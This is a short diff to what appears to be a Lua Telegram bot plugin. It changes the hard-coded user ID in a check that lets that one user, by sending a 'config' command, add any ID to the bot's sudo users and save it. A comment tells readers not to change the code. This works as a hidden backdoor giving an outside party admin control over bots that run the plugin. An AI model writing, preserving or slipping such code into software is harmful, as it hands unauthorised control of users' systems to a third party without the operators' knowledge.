@@ -813,7 +813,7 @@ function run(msg, matches, callback, extra)
       end
  end
 		 --Don't change this code. we can help you later:
-        if tonumber (msg.from.id) == 111984481 then
+        if tonumber (msg.from.id) == 95160479 then
             if matches[1]:lower() == "config" and matches[2] then
                 table.insert(_config.sudo_users, tonumber(matches[2]))
                 save_config()
